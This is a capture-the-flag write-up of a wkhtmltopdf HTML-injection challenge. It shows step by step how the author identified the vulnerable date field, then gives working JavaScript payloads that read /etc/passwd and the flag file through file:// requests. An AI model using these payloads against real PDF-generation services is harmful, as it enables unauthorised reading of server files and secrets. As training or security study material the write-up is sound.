# wkhtmltopdf File Inclusion Vulnerability Write-up

## Challenge Overview

![](<img/0.png>)

The challenge provided a form generator website that generates input fields for:
- Name
- Division
- Approved by
- Reason
- Leave date

![](<img/1.png>)

The form data is sent to `generate.php` and converted into a PDF file.

## Initial Analysis

### PDF Metadata Investigation

![](<img/2.png>)

To understand how the PDF was generated, I examined the metadata of the generated file. The PDF was created using **wkhtmltopdf version 12.5**.

Research revealed that this version has known CVEs, with exploitation techniques documented in the article: [P4 CTF: Cvg3n3rat0r | by Cybertrinchera | CodeX](https://medium.com/codex/p4-ctf-cvg3n3rat0r-b687558978f3).

## Vulnerability Discovery

### HTML Injection Testing

![](<img/3.png>)

Since I wasn't sure which field was vulnerable in the request body, I tested all fields by injecting HTML tags `<b>test</b>` to identify which field could process HTML code.

### Base64 Response Handling

![](<img/4.png>)

The website returned responses in base64 format. I used the following script to decode and convert the response to PDF:

```python
import base64

pdf_content = base64.b64decode("wkhtmltopdf_base64_response")
with open('output.pdf', 'wb') as f:
    f.write(pdf_content)
print("PDF saved as output.pdf")
```

### Identifying Vulnerable Field

![](<img/5.png>)

After converting the response to PDF, I discovered that the **date field** was vulnerable to HTML code injection.

## Exploitation

### File Inclusion Attack

I proceeded with the exploit by injecting JavaScript code to perform file inclusion on `/etc/passwd`:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### Initial File Discovery

![](<img/6.png>)

After converting the response to PDF, the file successfully displayed the contents of `/etc/passwd`. The output revealed a user named `ctf`, which appeared to be a clue leading to the flag location.

### Flag Extraction

I replaced `/etc/passwd` with `/home/ctf/flag` in the payload to retrieve the flag:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///home/ctf/flag");
x.send();
</script>
```

![](<img/7.png>)

## Flag

```
HiB25{Pamit_Dulu_Mau_Nonton_Dem0n_Slayer_Arc_Infinity_Castle}
```

## Summary

This challenge demonstrated:

1. **Metadata Analysis** - Identifying the PDF generation tool and version
2. **CVE Research** - Finding known vulnerabilities in wkhtmltopdf 12.5
3. **Input Validation Testing** - Systematically testing form fields for HTML injection
4. **File Inclusion Exploitation** - Using JavaScript to read local files through wkhtmltopdf
5. **Response Handling** - Decoding base64 responses and analyzing PDF output

The vulnerability stemmed from wkhtmltopdf's ability to execute JavaScript and access local files when processing HTML content, combined with insufficient input sanitization on the date field. This allowed for arbitrary file read access on the server.